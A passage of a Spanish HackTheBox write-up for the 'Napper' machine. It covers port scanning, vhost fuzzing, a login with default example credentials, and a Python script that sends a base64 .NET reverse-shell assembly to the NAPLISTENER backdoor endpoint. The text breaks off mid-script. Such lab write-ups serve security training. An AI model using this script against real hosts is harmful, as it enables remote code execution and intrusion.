<!doctype html><html lang=es><head><title>HTB Napper WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Napper' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Napper WriteUp"><meta name=twitter:description content="HackTheBox 'Napper' WriteUp"><meta property="og:title" content="HTB Napper WriteUp"><meta property="og:description" content="HackTheBox 'Napper' WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/napper/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-04-27T00:00:00+00:00"><meta property="article:modified_time" content="2024-04-27T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/napper/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/napper/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/napper/>HTB Napper WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-04-27T00:00:00Z>27 abril, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
20 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hard/>Hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/pivoting/>Pivoting</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/runascs/>Runascs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/cmd/>Cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/reverse-engineering/>Reverse Engineering</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/go/>Go</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ghidra/>Ghidra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/python/>Python</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/c>C#</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/winpeas/>Winpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/mcs/>Mcs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/revshells.com/>Revshells.com</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/port-forwarding/>Port Forwarding</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/chisel/>Chisel</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/elasticsearch/>Elasticsearch</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/certutil/>Certutil</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/decrypt/>Decrypt</a></span></div></div></header><div class=post-content><h1 id=napper----hackthebox>Napper &ndash; HackTheBox
<a class=heading-link href=#napper----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Dificultad: <em>Hard/Dif√≠cil</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Napper&rsquo; Avatar" src=/pentesting/images/Napper_avatar.png></p><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>El scan de <code>Nmap</code> s√≥lo muestar 3 puertos abiertos: <code>80</code> <code>HTTP</code>, <code>443</code> <code>HTTPs</code>, y <code>7680</code> &ndash;un servicio desconocido&ndash;.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.10.11.240 -oG allPorts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Nmap scan report for 10.10.11.240
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received user-set (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-04-26 17:43:11 -04 for 27s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65532 filtered tcp ports (no-response)
</span></span></span><span class=line><span class=cl><span class=go>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span></span><span class=line><span class=cl><span class=go>PORT     STATE SERVICE   REASON
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http      syn-ack ttl 127
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  https     syn-ack ttl 127
</span></span></span><span class=line><span class=cl><span class=go>7680/tcp open  pando-pub syn-ack ttl 127
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Read data files from: /usr/bin/../share/nmap
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
</span></span></span><span class=line><span class=cl><span class=go>           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
</span></span></span></code></pre></div><p>y chequeando sus versiones vemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80,443,7680 10.10.11.240 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 17:44 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.240
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.20s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http       Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://app.napper.htb
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Research Blog | Home
</span></span></span><span class=line><span class=cl><span class=go>| tls-alpn:
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>| http-methods:
</span></span></span><span class=line><span class=cl><span class=go>|_  Potentially risky methods: TRACE
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: DNS:app.napper.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-06-07T14:58:55
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2033-06-04T14:58:55
</span></span></span><span class=line><span class=cl><span class=go>|_http-generator: Hugo 0.112.3
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-04-26T21:45:22+00:00; +4s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>7680/tcp open  pando-pub?
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: 3s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 67.24 seconds
</span></span></span></code></pre></div><ul><li>Del scan puedo ver que la conexi√≥n al puerto <code>80</code> redirige a <code>app.napper.htb</code>. De manera que agrego ese dominio, y tambi√©n <code>napper.htb</code>, a mi archivo <code>/etc/hosts</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.240 napper.htb app.napper.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><ul><li>Luego de agregar los dominios a mi archivo <code>/etc/hosts</code>, si visitamos <code>https://app.napper.htb</code> podemos ver una p√°gina que parece algo as√≠ como un blog:</li></ul><p><img alt="Napper 1" src=/pentesting/images/Napper_1.png></p><ul><li>El sitio presenta mucha info de <code>Reverse Engineering</code> (Ingenier√≠a Inversa), de manera que puede ser una pista a lo que est√° por venir.</li><li>En este sitio web hay muchas explicaciones de c√≥mo crear un certificado <code>SSL</code> propio usando herramientas como <code>Powershell</code>. Un post llamado <code>Enabling Basic Authentication on IIS Using PowerShell: A Step-by-Step Guide</code> (que se encuentra en la segunda p√°gina del blog) es interesante. All√≠ se presenta un mont√≥n de informaci√≥n:</li></ul><p><img alt="Napper 2" src=/pentesting/images/Napper_3.png></p><ul><li>En el paso 6 de este post del bloghay una informaci√≥n acerca de usuarios y contrase√±as de ejemplo, las cuales podr√≠an ser las que vengan por defecto:</li></ul><p><img alt="Napper 3" src=/pentesting/images/Napper_4.png></p><p>que dice en espec√≠fico:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>New-LocalUser</span> <span class=n>-Name</span> <span class=s2>&#34;example&#34;</span> <span class=n>-Password</span> <span class=p>(</span><span class=nb>ConvertTo-SecureString</span> <span class=n>-String</span> <span class=s2>&#34;ExamplePassword&#34;</span> <span class=n>-AsPlainText</span> <span class=n>-Force</span><span class=p>)</span>
</span></span></code></pre></div><p>De manera que tenemos credenciales <code>example:ExamplePassword</code>.</p><ul><li>Analizando otros posts del blog no da muchos m√°s datos relevantes.</li><li>En este punto decido chequear por <code>vhosts</code> usando <code>ffuf</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://napper.htb/ -H &#39;Host: FUZZ.napper.htb&#39; -fl 187
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : https://napper.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.napper.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response lines: 187
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>internal                [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 419ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
</span></span></span></code></pre></div><p>y encontramos un nuevo dominio: <code>internal.napper.htb</code></p><ul><li>De manera que agrego <code>internal.napper.htb</code> en la misma l√≠nea que est√°n localizados <code>app.napper.htb</code> y <code>napper.htb</code> en el archivo <code>/etc/hosts</code>. As√≠ que √©ste se ve finalmente como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>127.0.0.1       localhost
</span></span></span><span class=line><span class=cl><span class=go>127.0.1.1       kali.gunzf0x    kali
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> The following lines are desirable <span class=k>for</span> IPv6 capable hosts
</span></span><span class=line><span class=cl><span class=go>::1     localhost ip6-localhost ip6-loopback
</span></span></span><span class=line><span class=cl><span class=go>ff02::1 ip6-allnodes
</span></span></span><span class=line><span class=cl><span class=go>ff02::2 ip6-allrouters
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.240 app.napper.htb napper.htb internal.napper.htb
</span></span></span></code></pre></div><ul><li>Si visitamos <code>https://internal.napper.htb</code> esta p√°gina nos pregunta inmediatamente por credenciales:</li></ul><p><img alt="Napper 4" src=/pentesting/images/Napper_2.png></p><p>¬øY si este esitio usa las credenciales por defecto que hab√≠amos hallado antes?</p><ul><li>Trato de loguearme con las credenciales <code>example:ExamplePassword</code>, ¬°y funcionan! Una vez dentro podemos ver el mismo tipo de blog a la p√°gina que hab√≠amos visto, pero con un post diferente:</li></ul><p><img alt="Napper 5" src=/pentesting/images/Napper_5.png></p><ul><li>Clickeando en <code>Read more</code> en este √∫nico post, √©ste muestra info acerca de un malware en <code>Microsoft .NET</code> (<code>C#</code>):</li></ul><p><img alt="Napper 6" src=/pentesting/images/Napper_6.png></p><ul><li>El sitio tiene algunas notas, como &ldquo;What we know so far&rdquo;:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[...] HTTP listener written in C#, which we refer to as NAPLISTENER. Consistent with SIESTAGRAPH and other malware families developed or used by this threat, NAPLISTENER appears designed to evade network-based forms of detection.  [...]
</span></span></code></pre></div><p>y &ldquo;In the sandbox I can&rsquo;t find the url&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>This means that any web request to /ews/MsExgHealthCheckd/ that contains a base64-encoded .NET assembly in the sdafwe3rwe23 parameter will be loaded and executed in memory. It&#39;s worth noting that the binary runs in a separate process and it is not associated with the running IIS server directly.
</span></span></code></pre></div><p>Adem√°s de algunos &ldquo;Logs&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>* 2023-04-24: Did some more reading up. We need to look for some URL and a special parameter
</span></span><span class=line><span class=cl>* 2023-04-23: Starting the RE process. Not sure on how to approach.
</span></span><span class=line><span class=cl>* 2023-04-22: Nothing seems to be showing up in the sandbox, i just startes and stops again. Will be testing local
</span></span><span class=line><span class=cl>* 2023-04-22: Got the copy of the backdoor, running in sandbox
</span></span></code></pre></div><ul><li>Una de las referencias compartidas acerca de este malware <a href=https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph class=external-link target=_blank rel=noopener>se hablan en este post de seguridad de Elastic</a>. Basado en la informaci√≥n de ambos posts, al parecer hay un endpoint <code>/ews/MsExgHealthCheckd/</code> con datos encodeados en <code>base64</code> a trav√©s de un par√°metro llamado <code>sdafwe3rwe23</code>.</li><li>Si un archivo infectado/malicioso est√° corriendo, entonces quiz√°s seamos capaces de enviar data al endpoint <code>/ews/MsExgHealthCheckd/</code> con el par√°metro <code>sdafwe3rwe23</code>. Primero, chequeo con <code>Burpsuite</code> a ver si este endpoint funciona:
<img alt="Napper 7" src=/pentesting/images/Napper_7.png>
y funciona, ya que obtenemos un status <code>200</code> (y notar que estamos usando <code>HTTP/2</code>, no <code>HTTP/1.1</code>).</li><li>En <a href=https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph class=external-link target=_blank rel=noopener>el post de seguridad de Elastic</a> se provee un c√≥digo/script en <code>Python</code>, el cual adapto a:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>warnings</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>signal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### For the payload remember to create a payload first in C# from revshells.com</span>
</span></span><span class=line><span class=cl><span class=c1>### then base64 encode it with &#34;base64 -w0 ./file.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>### and pass that encoded payload to this script</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+C</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>signal_handler</span><span class=p>(</span><span class=n>sig</span><span class=p>,</span> <span class=n>frame</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Ctrl+C! Exiting...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Capture Ctrl+C</span>
</span></span><span class=line><span class=cl><span class=n>signal</span><span class=o>.</span><span class=n>signal</span><span class=p>(</span><span class=n>signal</span><span class=o>.</span><span class=n>SIGINT</span><span class=p>,</span> <span class=n>signal_handler</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_if_https_in_url</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>port</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span><span class=o>-&gt;</span><span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Check the &#39;target&#39; argument the user has provided
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>url</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;https://&#39;</span><span class=p>)</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>url</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;https://</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_arguments</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>argparse</span><span class=o>.</span><span class=n>Namespace</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span><span class=o>=</span><span class=s1>&#39;Process some integers.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-t&#39;</span><span class=p>,</span> <span class=s1>&#39;--target&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Target IP address. Example: https://10.10.10.10&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-c&#39;</span><span class=p>,</span> <span class=s1>&#39;--command&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Encoded base64 command to run on the victim machine.&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-p&#39;</span><span class=p>,</span> <span class=s1>&#39;--port&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Port exposing the service. Default: 443&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mi>443</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--show-warnings&#39;</span><span class=p>,</span> <span class=n>action</span><span class=o>=</span><span class=s1>&#39;store_false&#39;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Show warnings (if there are).&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>args</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_request</span><span class=p>(</span><span class=n>args</span><span class=p>:</span> <span class=n>argparse</span><span class=o>.</span><span class=n>Namespace</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Set generic headers</span>
</span></span><span class=line><span class=cl>    <span class=n>req_headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-US,en;q=0.5&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate, br&#34;</span><span class=p>,</span> <span class=s2>&#34;Upgrade-Insecure-Requests&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=s2>&#34;Sec-Fetch-Dest&#34;</span><span class=p>:</span> <span class=s2>&#34;document&#34;</span><span class=p>,</span> <span class=s2>&#34;Sec-Fetch-Mode&#34;</span><span class=p>:</span> <span class=s2>&#34;navigate&#34;</span><span class=p>,</span> <span class=s2>&#34;Sec-Fetch-Site&#34;</span><span class=p>:</span> <span class=s2>&#34;none&#34;</span><span class=p>,</span> <span class=s2>&#34;Sec-Fetch-User&#34;</span><span class=p>:</span> <span class=s2>&#34;?1&#34;</span><span class=p>,</span> <span class=s2>&#34;Te&#34;</span><span class=p>:</span> <span class=s2>&#34;trailers&#34;</span><span class=p>,</span> <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1># Set the target to post data</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>check_if_https_in_url</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>target</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>post_url</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/ews/MsExgHealthCheckd/&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Set the data that will be posted</span>
</span></span><span class=line><span class=cl>    <span class=n>post_data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;sdafwe3rwe23&#39;</span><span class=p>:</span> <span class=n>args</span><span class=o>.</span><span class=n>command</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>post_data</span><span class=p>)</span>
